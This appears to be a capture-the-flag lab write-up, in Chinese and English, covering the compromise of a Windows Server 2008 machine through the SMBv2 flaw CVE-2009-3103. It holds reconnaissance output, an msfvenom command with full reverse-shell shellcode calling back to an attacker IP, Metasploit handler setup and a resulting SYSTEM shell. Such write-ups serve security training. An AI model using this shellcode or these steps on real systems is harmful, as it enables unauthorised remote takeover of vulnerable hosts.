# Internal
![image](https://hackmd.io/_uploads/SyutNm3hyl.png)

## Solution
### 1. Recon
#### 1.1 Nmap
```
┌──(chw㉿CHW)-[~]
└─$ nmap -sC -sV -T4 -p- 192.168.133.40
...
PORT      STATE    SERVICE       VERSION
53/tcp    open     domain        Microsoft DNS 6.0.6001 (17714650) (Windows Server 2008 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.0.6001 (17714650)
135/tcp   open     msrpc         Microsoft Windows RPC
139/tcp   open     netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open     microsoft-ds  Windows Server (R) 2008 Standard 6001 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
2460/tcp  filtered ms-theater
3389/tcp  open     ms-wbt-server Microsoft Terminal Service
| rdp-ntlm-info: 
|   Target_Name: INTERNAL
|   NetBIOS_Domain_Name: INTERNAL
|   NetBIOS_Computer_Name: INTERNAL
|   DNS_Domain_Name: internal
|   DNS_Computer_Name: internal
|   Product_Version: 6.0.6001
|_  System_Time: 2025-03-22T12:12:08+00:00
| ssl-cert: Subject: commonName=internal
| Not valid before: 2025-01-05T19:52:51
|_Not valid after:  2025-07-07T19:52:51
|_ssl-date: 2025-03-22T12:12:16+00:00; 0s from scanner time.
5357/tcp  open     http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Service Unavailable
|_http-server-header: Microsoft-HTTPAPI/2.0
6543/tcp  filtered mythtv
13216/tcp filtered bcslogc
13872/tcp filtered unknown
14657/tcp filtered unknown
15075/tcp filtered unknown
26509/tcp filtered unknown
28182/tcp filtered unknown
33705/tcp filtered unknown
37351/tcp filtered unknown
37998/tcp filtered unknown
43864/tcp filtered unknown
44421/tcp filtered unknown
49152/tcp open     msrpc         Microsoft Windows RPC
49153/tcp open     msrpc         Microsoft Windows RPC
49154/tcp open     msrpc         Microsoft Windows RPC
49155/tcp open     msrpc         Microsoft Windows RPC
49156/tcp open     msrpc         Microsoft Windows RPC
49157/tcp open     msrpc         Microsoft Windows RPC
49158/tcp open     msrpc         Microsoft Windows RPC
51714/tcp filtered unknown
52362/tcp filtered unknown
58509/tcp filtered unknown
61842/tcp filtered unknown
63645/tcp filtered unknown
64131/tcp filtered unknown
Service Info: Host: INTERNAL; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008::sp1, cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_server_2008:r2

Host script results:
| smb2-time: 
|   date: 2025-03-22T12:12:08
|_  start_date: 2025-02-20T21:30:47
| smb-os-discovery: 
|   OS: Windows Server (R) 2008 Standard 6001 Service Pack 1 (Windows Server (R) 2008 Standard 6.0)
|   OS CPE: cpe:/o:microsoft:windows_server_2008::sp1
|   Computer name: internal
|   NetBIOS computer name: INTERNAL\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2025-03-22T05:12:08-07:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_clock-skew: mean: 1h24m00s, deviation: 3h07m50s, median: 0s
| smb2-security-mode: 
|   2:0:2: 
|_    Message signing enabled but not required
|_nbstat: NetBIOS name: INTERNAL, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:ab:fb:ab (VMware)

...
```
> DNS, SMB, RPC, RDP

#### 1.2 enum4linux & smbclient
```
┌──(chw㉿CHW)-[~]
└─$ enum4linux -a 192.168.133.40 
...
 ===========================( Enumerating Workgroup/Domain on 192.168.133.40 )===========================
                                                  
[+] Got domain/workgroup name: WORKGROUP                                                            
 ===============================( Nbtstat Information for 192.168.133.40 )===============================

Looking up status of 192.168.133.40                                                                                                                        
        INTERNAL        <00> -         B <ACTIVE>  Workstation Service
        WORKGROUP       <00> - <GROUP> B <ACTIVE>  Domain/Workgroup Name
        INTERNAL        <20> -         B <ACTIVE>  File Server Service

        MAC Address = 00-50-56-AB-FB-AB
...
 ================================( Share Enumeration on 192.168.133.40 )================================
                                                                                                                                                           
do_connect: Connection to 192.168.133.40 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)                                                                  

        Sharename       Type      Comment
        ---------       ----      -------
Reconnecting with SMB1 for workgroup listing.
Unable to connect with SMB1 -- no workgroup available

[+] Attempting to map shares on 192.168.133.40 

┌──(chw㉿CHW)-[~]
└─$ smbclient -L //192.168.133.40/ -N

Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 192.168.133.40 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available

┌──(chw㉿CHW)-[~]
└─$ rpcclient -U '' -N 192.168.133.40

rpcclient $> enumdomusers
do_cmd: Could not initialise samr. Error was NT_STATUS_ACCESS_DENIED
rpcclient $> netshareenum
do_cmd: Could not initialise srvsvc. Error was NT_STATUS_ACCESS_DENIED
rpcclient $> lsaquery
do_cmd: Could not initialise lsarpc. Error was NT_STATUS_ACCESS_DENIED
rpcclient $> getdompwinfo
do_cmd: Could not initialise samr. Error was NT_STATUS_ACCESS_DENIED
```
> 皆沒有可用資訊

### 1.3 DNS
將 domain 加入 `/etc/host`
```
┌──(chw㉿CHW)-[~]
└─$ cat /etc/hosts                                          
192.168.133.40  Internal
...
┌──(chw㉿CHW)-[~]
└─$ ping Internal
PING Internal (192.168.133.40) 56(84) bytes of data.
64 bytes from Internal (192.168.133.40): icmp_seq=1 ttl=125 time=107 ms
64 bytes from Internal (192.168.133.40): icmp_seq=2 ttl=125 time=140 ms
```
### 1.4 Nmap script
到目前還沒有找到明顯可以利用的點\
利用 nmap smb-vuln* 的 NSE script 掃描 SMB port
```
┌──(chw㉿CHW)-[~]
└─$ nmap -p 445 --script smb-vuln* 192.168.133.40
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-22 08:43 EDT
Nmap scan report for Internal (192.168.133.40)
Host is up (0.13s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: Could not negotiate a connection:SMB: Failed to receive bytes: EOF
| smb-vuln-cve2009-3103: 
|   VULNERABLE:
|   SMBv2 exploit (CVE-2009-3103, Microsoft Security Advisory 975497)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2009-3103
|           Array index error in the SMBv2 protocol implementation in srv2.sys in Microsoft Windows Vista Gold, SP1, and SP2,
|           Windows Server 2008 Gold and SP2, and Windows 7 RC allows remote attackers to execute arbitrary code or cause a
|           denial of service (system crash) via an & (ampersand) character in a Process ID High header field in a NEGOTIATE
|           PROTOCOL REQUEST packet, which triggers an attempted dereference of an out-of-bounds memory location,
|           aka "SMBv2 Negotiation Vulnerability."
|           
|     Disclosure date: 2009-09-08
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3103
|_      http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3103

Nmap done: 1 IP address (1 host up) scanned in 25.64 seconds

```
### 2. Exploit DB
透過 [exploit-db](https://www.exploit-db.com/) 搜尋 exploit
![image](https://hackmd.io/_uploads/S1NYoBn31e.png)

### 3. 產出 meterpreter
因為 payload 是用 hardcode 寫死的，需要生成 shell code
```
┌──(chw㉿CHW)-[~]
└─$ msfvenom -p windows/shell/reverse_tcp LHOST=192.168.45.178 LPORT=8888 EXITFUNC=thread -f c
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 375 bytes
Final size of c file: 1605 bytes
unsigned char buf[] = 
"\xfc\xe8\x8f\x00\x00\x00\x60\x31\xd2\x64\x8b\x52\x30\x89"
"\xe5\x8b\x52\x0c\x8b\x52\x14\x0f\xb7\x4a\x26\x31\xff\x8b"
"\x72\x28\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d"
"\x01\xc7\x49\x75\xef\x52\x57\x8b\x52\x10\x8b\x42\x3c\x01"
"\xd0\x8b\x40\x78\x85\xc0\x74\x4c\x01\xd0\x8b\x48\x18\x8b"
"\x58\x20\x50\x01\xd3\x85\xc9\x74\x3c\x49\x8b\x34\x8b\x01"
"\xd6\x31\xff\x31\xc0\xc1\xcf\x0d\xac\x01\xc7\x38\xe0\x75"
"\xf4\x03\x7d\xf8\x3b\x7d\x24\x75\xe0\x58\x8b\x58\x24\x01"
"\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01"
"\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x58"
"\x5f\x5a\x8b\x12\xe9\x80\xff\xff\xff\x5d\x68\x33\x32\x00"
"\x00\x68\x77\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\x89\xe8"
"\xff\xd0\xb8\x90\x01\x00\x00\x29\xc4\x54\x50\x68\x29\x80"
"\x6b\x00\xff\xd5\x6a\x0a\x68\xc0\xa8\x2d\xb2\x68\x02\x00"
"\x22\xb8\x89\xe6\x50\x50\x50\x50\x40\x50\x40\x50\x68\xea"
"\x0f\xdf\xe0\xff\xd5\x97\x6a\x10\x56\x57\x68\x99\xa5\x74"
"\x61\xff\xd5\x85\xc0\x74\x0a\xff\x4e\x08\x75\xec\xe8\x67"
"\x00\x00\x00\x6a\x00\x6a\x04\x56\x57\x68\x02\xd9\xc8\x5f"
"\xff\xd5\x83\xf8\x00\x7e\x36\x8b\x36\x6a\x40\x68\x00\x10"
"\x00\x00\x56\x6a\x00\x68\x58\xa4\x53\xe5\xff\xd5\x93\x53"
"\x6a\x00\x56\x53\x57\x68\x02\xd9\xc8\x5f\xff\xd5\x83\xf8"
"\x00\x7d\x28\x58\x68\x00\x40\x00\x00\x6a\x00\x50\x68\x0b"
"\x2f\x0f\x30\xff\xd5\x57\x68\x75\x6e\x4d\x61\xff\xd5\x5e"
"\x5e\xff\x0c\x24\x0f\x85\x70\xff\xff\xff\xe9\x9b\xff\xff"
"\xff\x01\xc3\x29\xc6\x75\xc1\xc3\xbb\xe0\x1d\x2a\x0a\x68"
"\xa6\x95\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a\x80\xfb\xe0\x75"
"\x05\xbb\x47\x13\x72\x6f\x6a\x00\x53\xff\xd5";
```
### 4. 編輯並執行 exploit
將 shell 取代成上述生成的 shell code
```               
┌──(chw㉿CHW)-[~]
└─$ python2 Internal.py 192.168.133.40                   
Password for [WORKGROUP\Administrator]:
Cannot connect to server.  Error was NT_STATUS_LOGON_FAILURE

┌──(chw㉿CHW)-[~]
└─$ nc -nvlp 8888
listening on [any] 8888 ...
connect to [192.168.45.178] from (UNKNOWN) [192.168.133.40] 49159
ls
```
>[!Important]
> `nc` 無法處理 Windows CMD 輸出的流控制（stdin/stdout/stderr），所以 馬上被 cmd.exe 結束

nc 一連線就會斷，改用 `windows/shell/reverse_tcp`
```
┌──(chw㉿CHW)-[~]
└─$ msfconsole 
...
msf6 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/shell/reverse_tcp
payload => windows/shell/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 192.168.45.178
LHOST => 192.168.45.178
msf6 exploit(multi/handler) > set LPORT 8888
LPORT => 8888
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 192.168.45.178:8888 


```
重新執行 `Internal.py`
### 5. 取得 Shell
```
Shell Banner:
Microsoft Windows [Version 6.0.6001]
-----

C:\Windows\system32>hostname
hostname
internal

C:\Windows\system32>whoami
whoami
nt authority\system

```
### ✅ Get Root FLAG
> 在 `C:\Users\Administrator\Desktop` 找到 Root flag
